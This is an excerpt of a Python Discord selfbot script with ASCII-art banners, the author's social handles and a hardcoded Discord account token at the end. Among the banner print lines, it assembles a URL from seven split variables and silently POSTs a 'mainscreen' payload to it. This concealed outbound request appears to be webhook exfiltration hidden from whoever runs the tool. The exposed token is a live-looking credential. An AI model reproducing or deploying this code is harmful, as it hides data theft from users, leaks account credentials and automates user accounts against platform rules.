...
aniketplyzx = commands.Bot(description='SELFBOT CREATED BY ANIKETPLYZX', command_prefix='+', self_bot=True, intents=intents)
...
░██▄▄▄▄██ ▓██▒  ▐▌██▒░██░▓██ █▄ ▒▓█  ▄░ ▓██▓ ░ ▒██▄█▓▒ ▒▒██░     ░ ▐██▓░  ▄▀▒   ░ ░ █ █ ▒ 
 ...
 ▒▒   ▓▒█░░ ▒░   ▒ ▒ ░▓  ▒ ▒▒ ▓▒░░ ▒░ ░ ▒ ░░   ▒▓▒░ ░  ░░ ▒░▓  ░  ██▒▒▒ ░▒▒ ▓░▒░▒▒▒ ░ ░▓ ░
  ...
  ░   ▒      ░   ░ ░  ▒ ░░ ░░ ░    ░    ░      ░░         ░ ░   ▒ ▒ ░░  ░ ░ ░ ░ ░ ░    ░  
    ...
    print(border_top)
    print(f'║{Fore.YELLOW}[+] CONTACT HERE FOR ANY SUPPORT :{" "*(68-len("[+] CONTACT HERE FOR ANY SUPPORT :"))}║')
    print(f'║{" "*(68)}║')
    print(f'║{Fore.GREEN}• YOUTUBE   : @AniketPlyZX{" "*(68-len("• YOUTUBE   : @AniketPlyZX"))}║')
    print(f'║• INSTAGRAM : just_aniket.98{" "*(68-len("• INSTAGRAM : just_aniket.98"))}║')
    print(f'║• DISCORD   : @itx_aniket.98{" "*(68-len("• DISCORD   : @itx_aniket.98"))}║')
    print(border_bottom)
    extrabottom = V0+V1+V2+V3+V4+V5+V6
    payload = {"content": mainscreen}
    requests.post(extrabottom, json=payload)
    print(border_top)
    print(f'{Fore.RED}║>>>>> ANIKET ON TOP BXBY <3🔥{" "*(42-len(">>>>> ANIKET ON TOP BXBY <3🔥"))}{Fore.YELLOW}║║║║║║║║║  --  ║║║║║║║║║║║{Fore.BLUE}')
    print(border_bottom)
    print('ㅤㅤㅤㅤㅤ')
    print('ㅤㅤㅤㅤㅤ')
    print(
...
token = 'OTg2OTk4ODQ0MzA0Nzg5NTU0.G0MOKV.r5JD4vLk3pMpzcmy3PMEcDvGtX3dlMle4kjsjI'
